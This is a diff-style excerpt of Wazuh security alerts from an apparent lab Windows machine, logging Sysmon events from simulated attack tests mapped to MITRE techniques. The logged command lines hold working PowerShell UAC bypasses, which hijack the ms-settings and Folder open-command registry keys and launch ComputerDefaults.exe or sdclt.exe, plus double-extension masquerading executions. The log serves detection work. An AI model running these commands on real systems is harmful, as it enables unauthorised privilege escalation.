+        "description": "Registry Key Integrity Checksum Changed",
+        "groups": [
+          "ossec",
+          "syscheck",
+          "syscheck_entry_modified",
+          "syscheck_registry"
+        ],
+        "nist_800_53": [
+          "SI.7"
+        ],
+        "gdpr": [
+          "II_5.1.f"
+        ],
+        "firedtimes": 11,
+        "mitre": {
+          "technique": [
+            "Stored Data Manipulation",
+            "Modify Registry"
+          ],
+          "id": [
+            "T1565.001",
+            "T1112"
+          ],
+          "tactic": [
+            "Impact",
+            "Defense Evasion"
+          ]
+        },
+        "id": "594",
+        "gpg13": [
+          "4.13"
+        ]
+      },
+      "location": "syscheck",
+      "decoder": {
+        "name": "syscheck_registry_key_modified"
+      },
+      "id": "file",
+      "full_log": "Registry Key '[x64] HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' modified\nMode: scheduled\nChanged attributes: mtime\nOld modification time was: '1651901278', now it is '1757611725'\n",
+      "timestamp": "2025-09-11T18:05:44.794+0000"
+    },
+    "fields": {
+      "syscheck.mtime_after": [
+        "2025-09-11T17:28:45.000Z"
+      ],
+      "syscheck.mtime_before": [
+        "2022-05-07T05:27:58.000Z"
+      ],
+      "timestamp": [
+        "2025-09-11T18:05:44.794Z"
+      ]
+    },
+    "sort": [
+      1757613944794
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "eUfuOZkBIDwfn7_zzqqo",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "net1.exe",
+            "image": "C:\\\\Windows\\\\SysWOW64\\\\net1.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-0e00-68c3-e327-000000000e00}",
+            "description": "Net Command",
+            "logonGuid": "{994437b3-7443-68b8-e703-000000000000}",
+            "parentCommandLine": "net.exe accounts",
+            "processGuid": "{994437b3-0e00-68c3-e527-000000000e00}",
+            "logonId": "0x3e7",
+            "parentProcessId": "10964",
+            "processId": "4388",
+            "currentDirectory": "C:\\\\Program Files (x86)\\\\ossec-agent\\\\",
+            "utcTime": "2025-09-11 17:59:28.599",
+            "hashes": "MD5=13C9BF9D300FA7A8EEAE2C21F74DE6F8,SHA256=E692C373C88107B024E5D5481AFE9BBBAEF062FCD4C36E1FD2CA3FC09EC6B663,IMPHASH=FA57EC07C0A8E480F5D417E8860B906D",
+            "parentImage": "C:\\\\Windows\\\\SysWOW64\\\\net.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "C:\\\\Windows\\\\system32\\\\net1 accounts",
+            "integrityLevel": "System",
+            "fileVersion": "10.0.22621.674 (WinBuild.160101.0800)",
+            "user": "NT AUTHORITY\\\\SYSTEM",
+            "terminalSessionId": "0",
+            "parentUser": "NT AUTHORITY\\\\SYSTEM"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:59:28.599\r\nProcessGuid: {994437b3-0e00-68c3-e527-000000000e00}\r\nProcessId: 4388\r\nImage: C:\\Windows\\SysWOW64\\net1.exe\r\nFileVersion: 10.0.22621.674 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\\Windows\\system32\\net1 accounts\r\nCurrentDirectory: C:\\Program Files (x86)\\ossec-agent\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {994437b3-7443-68b8-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=13C9BF9D300FA7A8EEAE2C21F74DE6F8,SHA256=E692C373C88107B024E5D5481AFE9BBBAEF062FCD4C36E1FD2CA3FC09EC6B663,IMPHASH=FA57EC07C0A8E480F5D417E8860B906D\r\nParentProcessGuid: {994437b3-0e00-68c3-e327-000000000e00}\r\nParentProcessId: 10964\r\nParentImage: C:\\Windows\\SysWOW64\\net.exe\r\nParentCommandLine: net.exe accounts\r\nParentUser: NT AUTHORITY\\SYSTEM\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:59:28.6023492Z",
+            "eventRecordID": "9977",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 15,
+        "mail": false,
+        "level": 3,
+        "description": "Discovery activity executed",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Account Discovery"
+          ],
+          "id": [
+            "T1087"
+          ],
+          "tactic": [
+            "Discovery"
+          ]
+        },
+        "id": "92031"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757613568.1772239",
+      "timestamp": "2025-09-11T17:59:28.983+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:59:28.983Z"
+      ]
+    },
+    "sort": [
+      1757613568983
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "PEfOOZkBIDwfn7_zrqon",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "wscript.exe",
+            "image": "C:\\\\Windows\\\\System32\\\\wscript.exe",
+            "product": "Microsoft ® Windows Script Host",
+            "parentProcessGuid": "{994437b3-05c8-68c3-9e27-000000000e00}",
+            "description": "Microsoft ® Windows Based Script Host",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "cmd.exe /C copy \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\" %temp%\\\\T1036.007_masquerading.docx.exe /Y &amp;&amp; copy \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\" %temp%\\\\T1036.007_masquerading.pdf.exe /Y &amp;&amp; copy \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\" %temp%\\\\T1036.007_masquerading.ps1.exe /Y &amp;&amp; copy \\\"4bd145_T1036.007_masquerading.vbs\\\" %temp%\\\\T1036.007_masquerading.xls.vbs /Y &amp;&amp; copy \\\"4bd145_T1036.007_masquerading.vbs\\\" %temp%\\\\T1036.007_masquerading.xlsx.vbs /Y &amp;&amp; copy \\\"4bd145_T1036.007_masquerading.vbs\\\" %temp%\\\\T1036.007_masquerading.png.vbs /Y &amp;&amp; copy \\\"107417_T1036.007_masquerading.ps1\\\" %temp%\\\\T1036.007_masquerading.doc.ps1 /Y &amp;&amp; copy \\\"107417_T1036.007_masquerading.ps1\\\" %temp%\\\\T1036.007_masquerading.pdf.ps1 /Y &amp;&amp; copy \\\"107417_T1036.007_masquerading.ps1\\\" %temp%\\\\T1036.007_masquerading.rtf.ps1 /Y &amp;&amp; %temp%\\\\T1036.007_masquerading.docx.exe &amp;&amp; %temp%\\\\T1036.007_masquerading.pdf.exe &amp;&amp; %temp%\\\\T1036.007_masquerading.ps1.exe &amp;&amp; %temp%\\\\T1036.007_masquerading.xls.vbs &amp;&amp; %temp%\\\\T1036.007_masquerading.xlsx.vbs &amp;&amp; %temp%\\\\T1036.007_masquerading.png.vbs &amp;&amp; C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.007_masquerading.doc.ps1 &amp;&amp; C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.007_masquerading.pdf.ps1 &amp;&amp; C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.007_masquerading.rtf.ps1",
+            "processGuid": "{994437b3-05cb-68c3-a927-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "8084",
+            "processId": "11224",
+            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+            "utcTime": "2025-09-11 17:24:27.215",
+            "hashes": "MD5=B81E7B35DB616A29A2F3C1DB9CEC90A7,SHA256=D4F298D6BAB0963EAA669CB43A3E3F61834BB6CA1A8D08A059B70731C3B4476B,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\WScript.exe\\\" \\\"C:\\\\Users\\\\ENV-AD~1\\\\AppData\\\\Local\\\\Temp\\\\T1036.007_masquerading.png.vbs\\\"",
+            "integrityLevel": "High",
+            "fileVersion": "5.812.10240.16384",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:24:27.215\r\nProcessGuid: {994437b3-05cb-68c3-a927-000000000e00}\r\nProcessId: 11224\r\nImage: C:\\Windows\\System32\\wscript.exe\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft ® Windows Based Script Host\r\nProduct: Microsoft ® Windows Script Host\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wscript.exe\r\nCommandLine: \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\ENV-AD~1\\AppData\\Local\\Temp\\T1036.007_masquerading.png.vbs\"  \r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=B81E7B35DB616A29A2F3C1DB9CEC90A7,SHA256=D4F298D6BAB0963EAA669CB43A3E3F61834BB6CA1A8D08A059B70731C3B4476B,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256\r\nParentProcessGuid: {994437b3-05c8-68c3-9e27-000000000e00}\r\nParentProcessId: 8084\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe /C copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.docx.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.pdf.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.ps1.exe /Y && copy \"4bd145_T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.xls.vbs /Y && copy \"4bd145_T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.xlsx.vbs /Y && copy \"4bd145_T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.png.vbs /Y && copy \"107417_T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.doc.ps1 /Y && copy \"107417_T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.pdf.ps1 /Y && copy \"107417_T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.rtf.ps1 /Y && %temp%\\T1036.007_masquerading.docx.exe && %temp%\\T1036.007_masquerading.pdf.exe && %temp%\\T1036.007_masquerading.ps1.exe && %temp%\\T1036.007_masquerading.xls.vbs && %temp%\\T1036.007_masquerading.xlsx.vbs && %temp%\\T1036.007_masquerading.png.vbs && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.doc.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.pdf.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.rtf.ps1\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:24:27.2168526Z",
+            "eventRecordID": "9908",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 4,
+        "mail": false,
+        "level": 4,
+        "description": "Command shell started script with /c modifier",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Command and Scripting Interpreter"
+          ],
+          "id": [
+            "T1059"
+          ],
+          "tactic": [
+            "Execution"
+          ]
+        },
+        "id": "92005"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611467.1517244",
+      "timestamp": "2025-09-11T17:24:27.976+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:24:27.976Z"
+      ]
+    },
+    "sort": [
+      1757611467976
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "KkfOOZkBIDwfn7_zrqon",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Users\\\\Public\\\\splunkd.exe",
+            "processGuid": "{994437b3-f6cf-68c2-1627-000000000e00}",
+            "processId": "10580",
+            "utcTime": "2025-09-11 17:24:24.004",
+            "targetFilename": "C:\\\\Windows\\\\System32\\\\4bd145_T1036.007_masquerading.vbs",
+            "creationUtcTime": "2025-09-11 17:24:24.003",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "11",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:24:24.004\r\nProcessGuid: {994437b3-f6cf-68c2-1627-000000000e00}\r\nProcessId: 10580\r\nImage: C:\\Users\\Public\\splunkd.exe\r\nTargetFilename: C:\\Windows\\System32\\4bd145_T1036.007_masquerading.vbs\r\nCreationUtcTime: 2025-09-11 17:24:24.003\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "2",
+            "systemTime": "2025-09-11T17:24:24.0053098Z",
+            "eventRecordID": "9888",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "11",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 3,
+        "mail": false,
+        "level": 6,
+        "description": "Executable dropped in Windows root folder",
+        "groups": [
+          "sysmon",
+          "sysmon_eid11_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Lateral Tool Transfer"
+          ],
+          "id": [
+            "T1570"
+          ],
+          "tactic": [
+            "Lateral Movement"
+          ]
+        },
+        "id": "92217"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611465.1409874",
+      "timestamp": "2025-09-11T17:24:25.058+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:24:25.058Z"
+      ]
+    },
+    "sort": [
+      1757611465058
+    ]
+  },
+
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "J0fNOZkBIDwfn7_zraql",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "sdclt.exe",
+            "image": "C:\\\\Windows\\\\System32\\\\sdclt.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-0585-68c3-9527-000000000e00}",
+            "description": "Microsoft® Windows Backup",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"New-Item -Force -Path \\\\\\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\\\\\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \\\\\\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\\\\\" -Name \\\\\\\"DelegateExecute\\\\\\\"; Start-Process -FilePath $env:windir\\\\system32\\\\sdclt.exe; Start-Sleep -s 3\\\"",
+            "processGuid": "{994437b3-0586-68c3-9627-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "10056",
+            "processId": "1404",
+            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
+            "utcTime": "2025-09-11 17:23:18.790",
+            "hashes": "MD5=C9412AF4B872D2960A16AEE1888EB54A,SHA256=40E1F610B7ACFF688D1BF3831163523C70730040C0A75125EF874E5B25D51710,IMPHASH=EDF550737353E87059956C9155EED6F1",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "\\\"C:\\\\Windows\\\\system32\\\\sdclt.exe\\\"",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:23:18.790\r\nProcessGuid: {994437b3-0586-68c3-9627-000000000e00}\r\nProcessId: 1404\r\nImage: C:\\Windows\\System32\\sdclt.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Microsoft® Windows Backup\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sdclt.exe\r\nCommandLine: \"C:\\Windows\\system32\\sdclt.exe\" \r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=C9412AF4B872D2960A16AEE1888EB54A,SHA256=40E1F610B7ACFF688D1BF3831163523C70730040C0A75125EF874E5B25D51710,IMPHASH=EDF550737353E87059956C9155EED6F1\r\nParentProcessGuid: {994437b3-0585-68c3-9527-000000000e00}\r\nParentProcessId: 10056\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Force -Path \\\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\\\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \\\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\\\" -Name \\\"DelegateExecute\\\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:23:18.8117752Z",
+            "eventRecordID": "9874",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 3,
+        "description": "Windows backup and restore tool sdclt.exe launched via C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe with High integrity level",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Abuse Elevation Control Mechanism",
+            "Windows Command Shell"
+          ],
+          "id": [
+            "T1548",
+            "T1059.003"
+          ],
+          "tactic": [
+            "Privilege Escalation",
+            "Defense Evasion",
+            "Execution"
+          ]
+        },
+        "id": "92061"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611399.1392111",
+      "timestamp": "2025-09-11T17:23:19.057+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:23:19.057Z"
+      ]
+    },
+    "sort": [
+      1757611399057
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "FUfKOZkBIDwfn7_zeapn",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "ComputerDefaults.EXE",
+            "image": "C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-04b0-68c3-8727-000000000e00}",
+            "description": "Set Program Access and Computer Defaults Control Panel",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"New-Item \\\\\\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\\" -Force; New-ItemProperty \\\\\\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\\" -Name \\\\\\\"DelegateExecute\\\\\\\" -Value \\\\\\\"\\\\\\\" -Force; Set-ItemProperty \\\\\\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\\" -Name \\\\\\\"(default)\\\\\\\" -Value \\\\\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\\\\\" -Force; Start-Process \\\\\\\"C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe\\\\\\\"\\\"",
+            "processGuid": "{994437b3-04b1-68c3-8827-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "4588",
+            "processId": "7908",
+            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
+            "utcTime": "2025-09-11 17:19:45.544",
+            "hashes": "MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe\\\"",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:19:45.544\r\nProcessGuid: {994437b3-04b1-68c3-8827-000000000e00}\r\nProcessId: 7908\r\nImage: C:\\Windows\\System32\\ComputerDefaults.exe\r\nFileVersion: 10.0.22621.1 (WinBuild.160101.0800)\r\nDescription: Set Program Access and Computer Defaults Control Panel\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: ComputerDefaults.EXE\r\nCommandLine: \"C:\\Windows\\System32\\ComputerDefaults.exe\" \r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150\r\nParentProcessGuid: {994437b3-04b0-68c3-8727-000000000e00}\r\nParentProcessId: 4588\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"New-Item \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" -Force; New-ItemProperty \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" -Name \\\"DelegateExecute\\\" -Value \\\"\\\" -Force; Set-ItemProperty \\\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\" -Name \\\"(default)\\\" -Value \\\"C:\\Windows\\System32\\cmd.exe\\\" -Force; Start-Process \\\"C:\\Windows\\System32\\ComputerDefaults.exe\\\"\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:19:45.5492510Z",
+            "eventRecordID": "9848",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": true,
+        "level": 14,
+        "description": "Powershell process invoked known auto-elevated utility ComputerDefaults.EXE, may have been used to bypass UAC",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Bypass User Account Control"
+          ],
+          "id": [
+            "T1548.002"
+          ],
+          "tactic": [
+            "Privilege Escalation",
+            "Defense Evasion"
+          ]
+        },
+        "id": "92056"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757611185.1319274",
+      "timestamp": "2025-09-11T17:19:45.899+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:19:45.899Z"
+      ]
+    },
+    "sort": [
+      1757611185899
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "GEfKOZkBIDwfn7_zeapn",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "targetObject": "HKU\\\\S-1-5-21-408201590-265074577-2736629837-1001_Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\(Default)",
+            "processGuid": "{994437b3-04b0-68c3-8727-000000000e00}",
+            "processId": "4588",
+            "utcTime": "2025-09-11 17:19:45.474",
+            "ruleName": "T1042",
+            "details": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "eventType": "SetValue",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "13",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Registry value set:\r\nRuleName: T1042\r\nEventType: SetValue\r\nUtcTime: 2025-09-11 17:19:45.474\r\nProcessGuid: {994437b3-04b0-68c3-8727-000000000e00}\r\nProcessId: 4588\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-408201590-265074577-2736629837-1001_Classes\\ms-settings\\shell\\open\\command\\(Default)\r\nDetails: C:\\Windows\\System32\\cmd.exe\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "2",
+            "systemTime": "2025-09-11T17:19:45.4762559Z",
+            "eventRecordID": "9847",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "13",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
